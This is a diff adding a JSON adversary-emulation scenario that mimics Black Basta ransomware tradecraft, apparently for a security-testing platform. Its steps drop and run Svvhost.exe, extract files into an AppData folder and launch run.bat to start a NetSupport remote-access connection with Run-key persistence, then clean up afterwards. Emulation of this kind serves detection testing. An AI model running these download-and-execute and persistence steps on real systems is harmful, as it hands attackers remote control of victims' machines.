@@ -1,0 +1,114 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Black Basta emulation that downloads Svvhost.exe to C:\\temp and executes to initiate netsupport connection.",
+        "display_name": "BlackBasta_svvhost",
+        "name": "BlackBasta_svvhost",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "2": {
+                "function": "ifelse",
+                "next": "15",
+                "step": "1",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c mkdir C:\\temp",
+                "rtags": [
+                    "att&ck-technique:T1222.001"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS://shared/threats/BlackBasta_NewTTPs/Svvhost.exe\" --dest \"C:\\temp\\Svvhost.exe\"",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "C:\\temp\\Svvhost.exe -y -gm2 -o\"%USERPROFILE%\\AppData\\Roaming\\MSN\\\"",
+                "rtags": [
+                    "att&ck-technique:T1219",
+                    "att&ck-technique:T1570"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "module": "run",
+                "request": "%USERPROFILE%\\AppData\\Roaming\\MSN\\run.bat",
+                "rtags": [
+                    "att&ck-technique:T1219",
+                    "att&ck-technique:T1112"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "time": "180",
+                "type": "delay"
+            },
+            "10": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN-UP"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "taskkill /IM \"client32.exe\" /F",
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v MSN /f",
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c rmdir /Q /S \"%USERPROFILE%\\AppData\\Roaming\\MSN\\\"",
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c rmdir /Q /S C:\\temp",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
